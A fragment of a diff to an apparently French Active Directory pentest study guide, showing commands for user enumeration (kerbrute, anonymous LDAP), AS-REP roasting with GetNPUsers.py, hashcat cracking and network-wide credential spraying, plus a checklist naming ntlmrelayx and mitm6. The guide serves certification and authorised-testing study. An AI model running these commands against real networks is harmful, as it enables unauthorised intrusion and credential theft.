-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">    </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="s1">&#39;\&#39;</span><span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f1<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span>&gt;<span class="w"> </span>~/certif/users.txt
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="c1"># Kerbrute (valider via AS-REQ Kerberos)</span>
-</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>kerbrute<span class="w"> </span>userenum<span class="w"> </span>--dc<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w">    </span>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w">    </span>-o<span class="w"> </span>~/certif/valid_users.txt
-</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>
-</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="c1"># LDAP anonyme</span>
-</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="w">    </span>-b<span class="w"> </span><span class="s2">&quot;DC=</span><span class="si">${</span><span class="nv">DOMAIN_FQDN</span><span class="p">/./,DC=</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="w">    </span><span class="s2">&quot;(objectClass=user)&quot;</span><span class="w"> </span>sAMAccountName<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="w">    </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>sAMAccountName<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span><span class="w"> </span><span class="se">\</span>
-</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="w">    </span>&gt;<span class="w"> </span>~/certif/users.txt
-</span></code></pre></div>
-<hr />
-<h2 id="26-as-rep-roasting-sans-credentials">2.6 — AS-REP Roasting sans credentials<a class="headerlink" href="#26-as-rep-roasting-sans-credentials" title="Permanent link">&para;</a></h2>
+<h2 id="26-as-rep-roasting-sans-credentials">2.6 : AS-REP Roasting sans credentials<a class="headerlink" href="#26-as-rep-roasting-sans-credentials" title="Permanent link">&para;</a></h2>
 <p>Si tu as une liste d'utilisateurs, tente l'AS-REP Roasting directement :</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>GetNPUsers.py<span class="w"> </span><span class="nv">$DOMAIN_FQDN</span>/<span class="w"> </span>-no-pass<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w">    </span>-usersfile<span class="w"> </span>~/certif/users.txt<span class="w"> </span><span class="se">\</span>
@@ -1853,7 +1854,7 @@ C'est souvent le cas sur les postes de travail, rarement sur les DC.</p>
 </span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>~/certif/hashes/asrep.hash<span class="w"> </span>/usr/share/wordlists/rockyou.txt
 </span></code></pre></div>
 <hr />
-<h2 id="27-valider-et-diffuser-les-credentials-obtenus">2.7 — Valider et diffuser les credentials obtenus<a class="headerlink" href="#27-valider-et-diffuser-les-credentials-obtenus" title="Permanent link">&para;</a></h2>
+<h2 id="27-valider-et-diffuser-les-credentials-obtenus">2.7 : Valider et diffuser les credentials obtenus<a class="headerlink" href="#27-valider-et-diffuser-les-credentials-obtenus" title="Permanent link">&para;</a></h2>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Dès qu&#39;on a user:password → tester sur tout le réseau</span>
 </span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$PWD</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>--continue-on-success
 </span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>
@@ -1874,8 +1875,10 @@ C'est souvent le cas sur les postes de travail, rarement sur les DC.</p>
 <li>[ ] Liste cibles relay générée (<code>--gen-relay-list</code>)</li>
 <li>[ ] ntlmrelayx lancé si cibles sans signing SMB</li>
 <li>[ ] mitm6 lancé (IPv6)</li>
-<li>[ ] Password spraying effectué (politique lockout vérifiée d'abord)</li>
-<li>[ ] AS-REP Roasting tenté sans auth</li>
+<li>[ ] Énumération users tentée (RID brute / kerbrute / LDAP anonyme) → <code>~/certif/users.txt</code></li>
+<li>[ ] Politique de verrouillage vérifiée (<code>--pass-pol</code>) avant spraying</li>
+<li>[ ] Password spraying effectué (1 mot de passe à la fois)</li>
+<li>[ ] AS-REP Roasting tenté sans auth (<code>GetNPUsers.py</code>)</li>
 <li>[ ] Credentials validés avec <code>nxc smb $RANGE</code></li>
 <li>[ ] <strong>Au moins 1 compte valide</strong> → continuer en <a href="../03-enumeration/">Phase 3</a></li>
 </ul>
